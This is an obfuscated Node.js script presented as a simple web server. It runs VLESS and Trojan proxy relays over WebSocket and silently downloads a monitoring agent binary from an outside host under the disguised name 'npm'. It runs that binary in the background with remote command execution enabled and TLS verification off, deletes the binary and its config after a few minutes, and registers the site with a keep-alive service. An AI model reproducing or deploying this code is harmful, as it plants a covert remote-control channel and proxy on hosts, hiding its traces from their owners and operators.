const _0x47b6f9=_0x5b55;function _0x5b55(_0x1ca680,_0x13bd8c){_0x1ca680=_0x1ca680-0x186;const _0x49ba7=_0x49ba();let _0x5b5515=_0x49ba7[_0x1ca680];return _0x5b5515;}(function(_0x430a1f,_0x70f842){const _0x2b0f31=_0x5b55,_0x3a23de=_0x430a1f();while(!![]){try{const _0x4bb684=-parseInt(_0x2b0f31(0x1e4))/0x1*(-parseInt(_0x2b0f31(0x1c8))/0x2)+parseInt(_0x2b0f31(0x1df))/0x3+parseInt(_0x2b0f31(0x1c3))/0x4*(parseInt(_0x2b0f31(0x1e1))/0x5)+-parseInt(_0x2b0f31(0x200))/0x6+-parseInt(_0x2b0f31(0x1f0))/0x7*(-parseInt(_0x2b0f31(0x1f2))/0x8)+-parseInt(_0x2b0f31(0x1a1))/0x9+-parseInt(_0x2b0f31(0x1aa))/0xa*(parseInt(_0x2b0f31(0x1ca))/0xb);if(_0x4bb684===_0x70f842)break;else _0x3a23de['push'](_0x3a23de['shift']());}catch(_0x417770){_0x3a23de['push'](_0x3a23de['shift']());}}}(_0x49ba,0x7a5aa));const os=require('os'),http=require(_0x47b6f9(0x1bc)),fs=require('fs'),axios=require(_0x47b6f9(0x1bd)),net=require(_0x47b6f9(0x19d)),path=require('path'),crypto=require('crypto'),{Buffer}=require(_0x47b6f9(0x1c5)),{exec,execSync}=require(_0x47b6f9(0x1bf)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x47b6f9(0x1ea)][_0x47b6f9(0x18f)]||'f0daff77-173e-45a7-8f8c-3977520b0bf8',NEZHA_SERVER=process[_0x47b6f9(0x1ea)][_0x47b6f9(0x1c0)]||'',NEZHA_PORT=process[_0x47b6f9(0x1ea)][_0x47b6f9(0x1f8)]||'',NEZHA_KEY=process[_0x47b6f9(0x1ea)][_0x47b6f9(0x1d4)]||'',DOMAIN=process[_0x47b6f9(0x1ea)][_0x47b6f9(0x186)]||_0x47b6f9(0x1b9),AUTO_ACCESS=process[_0x47b6f9(0x1ea)][_0x47b6f9(0x1f1)]||!![],WSPATH=process[_0x47b6f9(0x1ea)][_0x47b6f9(0x1d7)]||UUID[_0x47b6f9(0x1ee)](0x0,0x8),SUB_PATH=process[_0x47b6f9(0x1ea)][_0x47b6f9(0x18b)]||_0x47b6f9(0x188),NAME=process[_0x47b6f9(0x1ea)]['NAME']||'',PORT=process[_0x47b6f9(0x1ea)]['PORT']||0x1eb4;let ISP='';const GetISP=async()=>{const _0x1fe529=_0x47b6f9;try{const _0x354dca=await axios[_0x1fe529(0x1a6)](_0x1fe529(0x192)),_0x392f1d=_0x354dca[_0x1fe529(0x18d)];ISP=(_0x392f1d['country_code']+'-'+_0x392f1d[_0x1fe529(0x1b6)])[_0x1fe529(0x187)](/ /g,'_');}catch(_0x161c74){ISP='Unknown';}};GetISP();const httpServer=http[_0x47b6f9(0x1b3)]((_0x2b62a4,_0x22e4a1)=>{const _0x5da68f=_0x47b6f9;if(_0x2b62a4[_0x5da68f(0x1d8)]==='/'){const _0x1c792d=path[_0x5da68f(0x1e3)](__dirname,_0x5da68f(0x1ff));fs[_0x5da68f(0x1ad)](_0x1c792d,_0x5da68f(0x1b4),(_0x31bfc6,_0x270812)=>{const _0x42fc4e=_0x5da68f;if(_0x31bfc6){_0x22e4a1[_0x42fc4e(0x1e0)](0xc8,{'Content-Type':'text/html'}),_0x22e4a1['end']('Hello\x20world!');return;}_0x22e4a1['writeHead'](0xc8,{'Content-Type':_0x42fc4e(0x19c)}),_0x22e4a1[_0x42fc4e(0x18e)](_0x270812);});return;}else{if(_0x2b62a4[_0x5da68f(0x1d8)]==='/'+SUB_PATH){const _0x4cb55c=NAME?NAME+'-'+ISP:ISP,_0x329076=_0x5da68f(0x1c9)+UUID+'@'+DOMAIN+_0x5da68f(0x1a8)+DOMAIN+_0x5da68f(0x1dd)+DOMAIN+_0x5da68f(0x1af)+WSPATH+'#'+_0x4cb55c,_0x2b54d6=_0x5da68f(0x190)+UUID+'@'+DOMAIN+_0x5da68f(0x194)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x5da68f(0x1af)+WSPATH+'#'+_0x4cb55c,_0x21504e=_0x329076+'\x0a'+_0x2b54d6,_0x117574=Buffer[_0x5da68f(0x1bb)](_0x21504e)[_0x5da68f(0x1c7)](_0x5da68f(0x1a0));_0x22e4a1['writeHead'](0xc8,{'Content-Type':_0x5da68f(0x1f5)}),_0x22e4a1[_0x5da68f(0x18e)](_0x117574+'\x0a');}else _0x22e4a1['writeHead'](0x194,{'Content-Type':_0x5da68f(0x1f5)}),_0x22e4a1['end'](_0x5da68f(0x1e8));}}),wss=new WebSocket[(_0x47b6f9(0x1fe))]({'server':httpServer}),uuid=UUID[_0x47b6f9(0x187)](/-/g,''),DNS_SERVERS=[_0x47b6f9(0x1d1),_0x47b6f9(0x19b)];function resolveHost(_0xcd86d7){return new Promise((_0x3f17d0,_0x1d25fb)=>{const _0x2fa17e=_0x5b55;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2fa17e(0x1da)](_0xcd86d7)){_0x3f17d0(_0xcd86d7);return;}let _0x1b880b=0x0;function _0x408e0f(){const _0x48f4cb=_0x2fa17e;if(_0x1b880b>=DNS_SERVERS[_0x48f4cb(0x19a)]){_0x1d25fb(new Error(_0x48f4cb(0x1f6)+_0xcd86d7+_0x48f4cb(0x1fc)));return;}const _0x104d0b=DNS_SERVERS[_0x1b880b];_0x1b880b++;const _0x266a0e=_0x48f4cb(0x1e6)+encodeURIComponent(_0xcd86d7)+_0x48f4cb(0x1d0);axios[_0x48f4cb(0x1a6)](_0x266a0e,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})['then'](_0x56bf16=>{const _0x4847e7=_0x48f4cb,_0x2518f6=_0x56bf16[_0x4847e7(0x18d)];if(_0x2518f6[_0x4847e7(0x1b0)]===0x0&&_0x2518f6['Answer']&&_0x2518f6[_0x4847e7(0x1b8)][_0x4847e7(0x19a)]>0x0){const _0x33fa67=_0x2518f6[_0x4847e7(0x1b8)]['find'](_0x17010d=>_0x17010d['type']===0x1);if(_0x33fa67){_0x3f17d0(_0x33fa67[_0x4847e7(0x18d)]);return;}}_0x408e0f();})[_0x48f4cb(0x1f3)](_0x14b4df=>{_0x408e0f();});}_0x408e0f();});}function handleVlessConnection(_0x2f01f6,_0x4768b9){const _0x2a229d=_0x47b6f9,[_0x409c0f]=_0x4768b9,_0x563582=_0x4768b9[_0x2a229d(0x1ee)](0x1,0x11);if(!_0x563582['every']((_0x29484b,_0x2848e7)=>_0x29484b==parseInt(uuid[_0x2a229d(0x1b2)](_0x2848e7*0x2,0x2),0x10)))return![];let _0x191722=_0x4768b9[_0x2a229d(0x1ee)](0x11,0x12)[_0x2a229d(0x1a9)]()+0x13;const _0x4ef8b1=_0x4768b9[_0x2a229d(0x1ee)](_0x191722,_0x191722+=0x2)[_0x2a229d(0x1a7)](0x0),_0x4bbbde=_0x4768b9[_0x2a229d(0x1ee)](_0x191722,_0x191722+=0x1)[_0x2a229d(0x1a9)](),_0x1c16be=_0x4bbbde==0x1?_0x4768b9[_0x2a229d(0x1ee)](_0x191722,_0x191722+=0x4)['join']('.'):_0x4bbbde==0x2?new TextDecoder()[_0x2a229d(0x19f)](_0x4768b9[_0x2a229d(0x1ee)](_0x191722+0x1,_0x191722+=0x1+_0x4768b9[_0x2a229d(0x1ee)](_0x191722,_0x191722+0x1)['readUInt8']())):_0x4bbbde==0x3?_0x4768b9['slice'](_0x191722,_0x191722+=0x10)[_0x2a229d(0x1a3)]((_0x5e42cf,_0x3a5114,_0x120b2a,_0x3475da)=>_0x120b2a%0x2?_0x5e42cf[_0x2a229d(0x1ab)](_0x3475da[_0x2a229d(0x1ee)](_0x120b2a-0x1,_0x120b2a+0x1)):_0x5e42cf,[])['map'](_0x2eb140=>_0x2eb140[_0x2a229d(0x1a7)](0x0)[_0x2a229d(0x1c7)](0x10))[_0x2a229d(0x1e3)](':'):'';_0x2f01f6[_0x2a229d(0x1cd)](new Uint8Array([_0x409c0f,0x0]));const _0x47844f=createWebSocketStream(_0x2f01f6);return resolveHost(_0x1c16be)[_0x2a229d(0x19e)](_0x16bfe3=>{const _0x1368c4=_0x2a229d;net[_0x1368c4(0x1de)]({'host':_0x16bfe3,'port':_0x4ef8b1},function(){const _0x5e4a5f=_0x1368c4;this[_0x5e4a5f(0x1e7)](_0x4768b9[_0x5e4a5f(0x1ee)](_0x191722)),_0x47844f['on'](_0x5e4a5f(0x196),()=>{})['pipe'](this)['on'](_0x5e4a5f(0x196),()=>{})['pipe'](_0x47844f);})['on'](_0x1368c4(0x196),()=>{});})[_0x2a229d(0x1f3)](_0x23bc55=>{const _0xce7537=_0x2a229d;net[_0xce7537(0x1de)]({'host':_0x1c16be,'port':_0x4ef8b1},function(){const _0x1943ec=_0xce7537;this['write'](_0x4768b9[_0x1943ec(0x1ee)](_0x191722)),_0x47844f['on'](_0x1943ec(0x196),()=>{})['pipe'](this)['on'](_0x1943ec(0x196),()=>{})['pipe'](_0x47844f);})['on'](_0xce7537(0x196),()=>{});}),!![];}function handleTrojanConnection(_0x3fbff5,_0x2fa22f){const _0x444c89=_0x47b6f9;try{if(_0x2fa22f[_0x444c89(0x19a)]<0x3a)return![];const _0x57702f=_0x2fa22f[_0x444c89(0x1ee)](0x0,0x38)[_0x444c89(0x1c7)](),_0x4e6ee7=[UUID];let _0x7960e=null;for(const _0x13c8c8 of _0x4e6ee7){const _0x1df7f9=crypto[_0x444c89(0x1ac)](_0x444c89(0x1d3))[_0x444c89(0x1d6)](_0x13c8c8)[_0x444c89(0x1b7)](_0x444c89(0x1d2));if(_0x1df7f9===_0x57702f){_0x7960e=_0x13c8c8;break;}}if(!_0x7960e)return![];let _0x3e55eb=0x38;_0x2fa22f[_0x3e55eb]===0xd&&_0x2fa22f[_0x3e55eb+0x1]===0xa&&(_0x3e55eb+=0x2);const _0x23ded1=_0x2fa22f[_0x3e55eb];if(_0x23ded1!==0x1)return![];_0x3e55eb+=0x1;const _0x507410=_0x2fa22f[_0x3e55eb];_0x3e55eb+=0x1;let _0x5221d4,_0x360154;if(_0x507410===0x1)_0x5221d4=_0x2fa22f[_0x444c89(0x1ee)](_0x3e55eb,_0x3e55eb+0x4)[_0x444c89(0x1e3)]('.'),_0x3e55eb+=0x4;else{if(_0x507410===0x3){const _0x444585=_0x2fa22f[_0x3e55eb];_0x3e55eb+=0x1,_0x5221d4=_0x2fa22f['slice'](_0x3e55eb,_0x3e55eb+_0x444585)[_0x444c89(0x1c7)](),_0x3e55eb+=_0x444585;}else{if(_0x507410===0x4)_0x5221d4=_0x2fa22f[_0x444c89(0x1ee)](_0x3e55eb,_0x3e55eb+0x10)[_0x444c89(0x1a3)]((_0x123400,_0x2224b0,_0x1e9cc4,_0x3b7a90)=>_0x1e9cc4%0x2?_0x123400[_0x444c89(0x1ab)](_0x3b7a90[_0x444c89(0x1ee)](_0x1e9cc4-0x1,_0x1e9cc4+0x1)):_0x123400,[])[_0x444c89(0x1ed)](_0x58e820=>_0x58e820['readUInt16BE'](0x0)['toString'](0x10))['join'](':'),_0x3e55eb+=0x10;else return![];}}_0x360154=_0x2fa22f['readUInt16BE'](_0x3e55eb),_0x3e55eb+=0x2;_0x3e55eb<_0x2fa22f[_0x444c89(0x19a)]&&_0x2fa22f[_0x3e55eb]===0xd&&_0x2fa22f[_0x3e55eb+0x1]===0xa&&(_0x3e55eb+=0x2);const _0x1bdb96=createWebSocketStream(_0x3fbff5);return resolveHost(_0x5221d4)[_0x444c89(0x19e)](_0x3e9eec=>{const _0x3a5831=_0x444c89;net[_0x3a5831(0x1de)]({'host':_0x3e9eec,'port':_0x360154},function(){const _0x48b072=_0x3a5831;_0x3e55eb<_0x2fa22f[_0x48b072(0x19a)]&&this[_0x48b072(0x1e7)](_0x2fa22f['slice'](_0x3e55eb)),_0x1bdb96['on'](_0x48b072(0x196),()=>{})[_0x48b072(0x1ba)](this)['on'](_0x48b072(0x196),()=>{})[_0x48b072(0x1ba)](_0x1bdb96);})['on'](_0x3a5831(0x196),()=>{});})[_0x444c89(0x1f3)](_0xe03723=>{const _0x261029=_0x444c89;net[_0x261029(0x1de)]({'host':_0x5221d4,'port':_0x360154},function(){const _0x1acbda=_0x261029;_0x3e55eb<_0x2fa22f[_0x1acbda(0x19a)]&&this[_0x1acbda(0x1e7)](_0x2fa22f[_0x1acbda(0x1ee)](_0x3e55eb)),_0x1bdb96['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x1acbda(0x1ba)](_0x1bdb96);})['on']('error',()=>{});}),!![];}catch(_0x4ca593){return![];}}wss['on'](_0x47b6f9(0x1ef),(_0x2fbc3f,_0x63ac52)=>{const _0x5384a9=_0x47b6f9,_0x46d964=_0x63ac52[_0x5384a9(0x1d8)]||'';_0x2fbc3f[_0x5384a9(0x1d5)](_0x5384a9(0x199),_0x182fde=>{const _0x1a6371=_0x5384a9;if(_0x182fde[_0x1a6371(0x19a)]>0x11&&_0x182fde[0x0]===0x0){const _0x5f325e=_0x182fde[_0x1a6371(0x1ee)](0x1,0x11),_0x18e3a8=_0x5f325e['every']((_0x26b4ec,_0x3e4624)=>_0x26b4ec==parseInt(uuid['substr'](_0x3e4624*0x2,0x2),0x10));if(_0x18e3a8){!handleVlessConnection(_0x2fbc3f,_0x182fde)&&_0x2fbc3f[_0x1a6371(0x1f4)]();return;}}!handleTrojanConnection(_0x2fbc3f,_0x182fde)&&_0x2fbc3f[_0x1a6371(0x1f4)]();})['on'](_0x5384a9(0x196),()=>{});});const getDownloadUrl=()=>{const _0x5403a6=_0x47b6f9,_0x17109b=os[_0x5403a6(0x1fb)]();return _0x17109b===_0x5403a6(0x1eb)||_0x17109b==='arm64'||_0x17109b===_0x5403a6(0x1c6)?!NEZHA_PORT?_0x5403a6(0x18c):_0x5403a6(0x1c1):!NEZHA_PORT?_0x5403a6(0x1fa):_0x5403a6(0x1cb);},downloadFile=async()=>{const _0x548279=_0x47b6f9;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x5216a3=getDownloadUrl(),_0x286372=await axios({'method':_0x548279(0x1a6),'url':_0x5216a3,'responseType':_0x548279(0x193)}),_0x2d5629=fs[_0x548279(0x1a5)](_0x548279(0x1b5));return _0x286372[_0x548279(0x18d)][_0x548279(0x1ba)](_0x2d5629),new Promise((_0x21a23b,_0x4f7fb5)=>{const _0x58de74=_0x548279;_0x2d5629['on'](_0x58de74(0x1ec),()=>{const _0x301291=_0x58de74;console['log'](_0x301291(0x1e5)),exec('chmod\x20+x\x20npm',_0xfbc936=>{if(_0xfbc936)_0x4f7fb5(_0xfbc936);_0x21a23b();});}),_0x2d5629['on']('error',_0x4f7fb5);});}catch(_0x2695a4){throw _0x2695a4;}},runnz=async()=>{const _0x95920=_0x47b6f9;try{const _0x10711b=execSync(_0x95920(0x195),{'encoding':_0x95920(0x1e2)});if(_0x10711b['trim']()!==''){console['log'](_0x95920(0x1fd));return;}}catch(_0x48c04a){}await downloadFile();let _0x2c9abb='',_0x8cb6ea=[_0x95920(0x1be),_0x95920(0x1dc),'2096',_0x95920(0x1a4),'2083',_0x95920(0x189)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xe9a7ec=_0x8cb6ea[_0x95920(0x1b1)](NEZHA_PORT)?_0x95920(0x1d9):'';_0x2c9abb=_0x95920(0x1c4)+NEZHA_SERVER+':'+NEZHA_PORT+_0x95920(0x18a)+NEZHA_KEY+'\x20'+_0xe9a7ec+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2aad95=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')[_0x95920(0x1c2)]():'',_0x4c7842=_0x8cb6ea[_0x95920(0x1b1)](_0x2aad95)?'true':_0x95920(0x1ce),_0x374f54=_0x95920(0x1a2)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x95920(0x1e9)+_0x4c7842+_0x95920(0x197)+UUID;fs[_0x95920(0x1db)](_0x95920(0x198),_0x374f54);}_0x2c9abb='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x95920(0x191)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x2c9abb,{'shell':'/bin/bash'},_0x50a942=>{const _0x2b0cc4=_0x95920;if(_0x50a942)console['error']('npm\x20running\x20error:',_0x50a942);else console[_0x2b0cc4(0x191)]('npm\x20is\x20running');});}catch(_0x13fae7){console[_0x95920(0x196)]('error:\x20'+_0x13fae7);}};async function addAccessTask(){const _0x2a045f=_0x47b6f9;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x5d303b='https://'+DOMAIN;try{const _0x48bd41=await axios['post'](_0x2a045f(0x1f9),{'url':_0x5d303b},{'headers':{'Content-Type':_0x2a045f(0x1ae)}});console[_0x2a045f(0x191)](_0x2a045f(0x1f7));}catch(_0x371da7){}}function _0x49ba(){const _0x58daa5=['readUInt8','10MrUGRt','concat','createHash','readFile','application/json','&path=%2F','Status','includes','substr','createServer','utf8','npm','isp','digest','Answer','1234.abc.com','pipe','from','http','axios','443','child_process','NEZHA_SERVER','https://arm64.ssss.nyc.mn/agent','pop','738132eIgiya','setsid\x20nohup\x20./npm\x20-s\x20','buffer','aarch64','toString','51776IYQnNe','vless://','12360689VKPAQE','https://amd64.ssss.nyc.mn/agent','listen','send','false','unlink','&type=A','8.8.4.4','hex','sha224','NEZHA_KEY','once','update','WSPATH','url','--tls','test','writeFileSync','8443','&fp=chrome&type=ws&host=','connect','2782062tfGpaR','writeHead','10ohGmxU','utf-8','join','26yHvQrG','npm\x20download\x20successfully','https://dns.google/resolve?name=','write','Not\x20Found\x0a','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','env','arm','finish','map','slice','connection','7TIFHia','AUTO_ACCESS','5835152kAfxYP','catch','close','text/plain','Failed\x20to\x20resolve\x20','Automatic\x20Access\x20Task\x20added\x20successfully','NEZHA_PORT','https://oooo.serv00.net/add-url','https://amd64.ssss.nyc.mn/v1','arch','\x20with\x20all\x20DNS\x20servers','npm\x20is\x20already\x20running,\x20skip\x20running...','Server','index.html','2997780dihoje','DOMAIN','replace','sub','2053','\x20-p\x20','SUB_PATH','https://arm64.ssss.nyc.mn/v1','data','end','UUID','trojan://','log','https://api.ip.sb/geoip','stream',':443?security=tls&sni=','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','error','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','config.yaml','message','length','1.1.1.1','text/html','net','then','decode','base64','5169699XkKqEm','client_secret:\x20','reduce','2087','createWriteStream','get','readUInt16BE',':443?encryption=none&security=tls&sni='];_0x49ba=function(){return _0x58daa5;};return _0x49ba();}const delFiles=()=>{const _0x2c62d4=_0x47b6f9;fs[_0x2c62d4(0x1cf)](_0x2c62d4(0x1b5),()=>{}),fs[_0x2c62d4(0x1cf)](_0x2c62d4(0x198),()=>{});};httpServer[_0x47b6f9(0x1cc)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
